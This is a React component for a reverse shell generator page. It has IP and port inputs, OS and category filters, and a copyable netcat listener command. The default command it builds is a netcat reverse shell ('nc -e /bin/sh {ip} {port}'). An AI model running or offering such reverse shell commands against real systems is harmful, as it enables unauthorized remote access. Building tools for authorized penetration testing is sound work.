import React, { useState } from "react";
import { Wrapper } from "src/components/Dashboard/Profile/ProfileElements";
import {
    Input,
    Dropdown,
    ShellList,
    ReverseShellContainer,
    RevShellBodyTop,
    RevShellBodyBottom,
    OsSearchContainer,
    DownloadSection,
    RevShellBodyContainer,
    ShellDisplayContainer,
    KeyContainer,
    CommandDisplayContainer,
    CommandTitle,
    ReverseShellHeader,
    RevShellHeaderSubContainer,
    RevShellHeaderTop,
    RevShellHeaderMiddle,
    IpAndPortSubContainer2,
    PortNumberIncAndDec,
} from "./ReveseShellElement";

import { FaDownload, FaMinus, FaPlus } from "react-icons/fa";
import CodeSyntaxHighlighter from "src/components/Common/CodeSyntaxHighlighter";
import { ShellCommands, CommandType } from "./shellData";
import { BsClipboardFill } from "react-icons/bs";
import HeadingBanner from "src/components/Common/HeadingBanner/HeadingBanner";

function ReverseShellGenerator() {
    const [useIp, setIp] = useState("10.10.10.10");
    const [port, setPort] = useState(1337);
    const [currentCommand, setCommand] = useState("nc -e /bin/sh {ip} {port}");
    const [selected, setSelected] = useState("");
    // const [Os, setOS] = useState([]);
    const [searchInput, setSearchInput] = useState("");
    const [selectedCategory, setSelectedCategory] = useState(Object.values(CommandType)[0]);
    const [selectedOs, setSelectedOs] = useState("all");

    const rsgData = ShellCommands();

    const ipChange = () => {
        setIp(document.getElementById("IP").value);
    };

    const handleSearchChange = (event) => {
        setSearchInput(event.target.value);
    };

    // const osOptions = rsgData.shellCommands
    //     .find((category) => category[0].meta.includes(selectedCategory))
    //     ?.map((command) => command.name) || [];

    const filteredOsCommands = rsgData.shellCommands
        .find((category) => category[0].meta.includes(selectedCategory))
        ?.filter((command) => {
            if (selectedOs === "all") return true;
            return command.meta.includes(selectedOs);
        });

    const SetCurrent = (key) => {
        setSelected(key);
        const selectedCommand = rsgData.shellCommands
            .find((category) => category[0].meta.includes(selectedCategory))
            .find((command) => command.name === key);

        if (selectedCommand) {
            setCommand(selectedCommand.command);
        }
    };

    const chainingPort = () => {
        setPort(document.getElementById("ports").value || 0);
    };

    const copyToClipboard = (text) => {
        if (navigator?.clipboard?.writeText) {
            navigator.clipboard.writeText(text);
            document.getElementById("clipboard-toast").style.display = "block";
        } else if (window?.clipboardData?.setData) {
            window.clipboardData.setData("Text", text);
            document.getElementById("clipboard-toast").style.display = "block";
        } else {
            document.getElementById("clipboard-failure-toast").style.display = "block";
        }
    };

    const incrementPort = () => {
        setPort((prevPort) => prevPort + 1);
    };
    const decrementPort = () => {
        if (port > 0) {
            setPort((prevPort) => prevPort - 1);
        }
    };

    return (
        <Wrapper>
            <div style={{ display: "flex", flexDirection: "column", gap: "25px" }}>
                <HeadingBanner heading={"Shell Generator"} />
                <ReverseShellContainer>
                    <ReverseShellHeader>
                        <RevShellHeaderSubContainer>
                            <RevShellHeaderTop> IP & Port </RevShellHeaderTop>
                            <RevShellHeaderMiddle>
                                <IpAndPortSubContainer2>
                                    <label> IP </label>
                                    <Input id="IP" value={useIp} onChange={ipChange} />
                                </IpAndPortSubContainer2>
                                <IpAndPortSubContainer2>
                                    <label> Port </label>
                                    <Input id="ports" value={port} onChange={chainingPort} />
                                    <PortNumberIncAndDec>
                                        <FaPlus size={12} onClick={incrementPort} />
                                        <FaMinus size={12} onClick={decrementPort} />
                                    </PortNumberIncAndDec>
                                </IpAndPortSubContainer2>
                            </RevShellHeaderMiddle>
                        </RevShellHeaderSubContainer>

                        <RevShellHeaderSubContainer>
                            <RevShellHeaderTop> Listener </RevShellHeaderTop>
                            <RevShellHeaderMiddle>
                                <label id="rv"> nc -lvnp {port} </label>
                                <BsClipboardFill
                                    onClick={() => {
                                        copyToClipboard(document.getElementById("rv").innerText);
                                    }}
                                />
                            </RevShellHeaderMiddle>
                        </RevShellHeaderSubContainer>
                    </ReverseShellHeader>

                    <RevShellBodyContainer>
                        <div
                            style={{
                                display: "flex",
                                gap: "25px",
                                padding: "25px",
                                flexDirection: "row",
                                alignItems: "center",
                            }}
                        >
                            {Object.values(CommandType).map((category) => (
                                <span
                                    key={category}
                                    onClick={() => setSelectedCategory(category)}
                                    style={{ cursor: "pointer" }}
                                >
                                    {category}
                                </span>
                            ))}
                        </div>

                        <RevShellBodyTop>
                            <OsSearchContainer>
                                <label>OS</label>
                                <Dropdown
                                    id="OS-select"
                                    value={selectedOs}
                                    onChange={(e) => setSelectedOs(e.target.value)}
                                >
                                    <option value="all">All</option>
                                    <option value="windows">Window</option>
                                    <option value="linux">Linux</option>
                                    <option value="mac">Mac</option>
                                </Dropdown>
                            </OsSearchContainer>
                            <OsSearchContainer>
                                <label>Search</label>
                                <Input
                                    type="text"
                                    placeholder="Search..."
                                    value={searchInput}
                                    onChange={handleSearchChange}
                                />
                            </OsSearchContainer>
                            <OsSearchContainer>
                                <label> Download </label>
                                <DownloadSection>
                                    <FaDownload />
                                </DownloadSection>
                            </OsSearchContainer>
                        </RevShellBodyTop>

                        <RevShellBodyBottom>
                            <ShellDisplayContainer>
                                <ShellList id="shell-display">
                                    {filteredOsCommands?.map((command) => (
                                        <KeyContainer
                                            key={command.name}
                                            id={command.name}
                                            className="Key"
                                            onClick={() => {
                                                SetCurrent(command.name);
                                            }}
                                        >
                                            {command.name}
                                        </KeyContainer>
                                    ))}
                                </ShellList>
                            </ShellDisplayContainer>
                            <CommandDisplayContainer>
                                <CommandTitle>
                                    <CodeSyntaxHighlighter
                                        code={currentCommand
                                            .replace(/\{ip\}/i, useIp)
                                            .replace(/\{port\}/i, port)
                                            .replace(/\{shell\}/i, selected)
                                            .replace(/\{cmd\}/i, selected)}
                                    />
                                </CommandTitle>
                                {/* Shell Options Encode Options */}
                            </CommandDisplayContainer>
                        </RevShellBodyBottom>
                    </RevShellBodyContainer>
                </ReverseShellContainer>
            </div>
        </Wrapper>
    );
}

export default ReverseShellGenerator;
